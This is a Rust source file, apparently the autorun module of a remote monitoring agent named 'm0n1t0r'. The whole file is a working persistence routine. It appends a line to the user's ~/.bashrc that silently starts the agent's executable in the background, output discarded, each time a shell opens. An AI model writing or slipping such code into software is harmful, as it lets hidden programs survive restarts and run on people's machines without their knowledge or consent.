use directories::UserDirs;
use m0n1t0r_common::{Error, Result as AppResult};
use remoc::rtc;
use std::{env, os::unix::prelude::OsStrExt, path::PathBuf};
use tokio::{fs, io::AsyncWriteExt};

pub struct AgentObj {}

impl AgentObj {
    pub fn new() -> Self {
        Self {}
    }

    async fn add_current_user_internal(&self, exe: PathBuf, file: PathBuf) -> AppResult<()> {
        let user_dirs = UserDirs::new().ok_or(Error::NotFound)?;
        let mut payload = vec!['\n' as u8, '(' as u8];
        payload.append(&mut exe.as_os_str().as_bytes().to_vec());
        payload.append(&mut "&> /dev/null &)\n".as_bytes().to_vec());

        fs::OpenOptions::new()
            .append(true)
            .open(user_dirs.home_dir().join(&file))
            .await?
            .write(&payload)
            .await?;
        Ok(())
    }
}

#[rtc::async_trait]
impl m0n1t0r_common::autorun::Agent for AgentObj {
    async fn add_current_user_at(&self, exe: PathBuf) -> AppResult<()> {
        self.add_current_user_internal(exe, ".bashrc".into()).await
    }

    async fn add_current_user(&self) -> AppResult<()> {
        self.add_current_user_internal(env::current_exe()?.to_path_buf(), ".bashrc".into())
            .await
    }
}
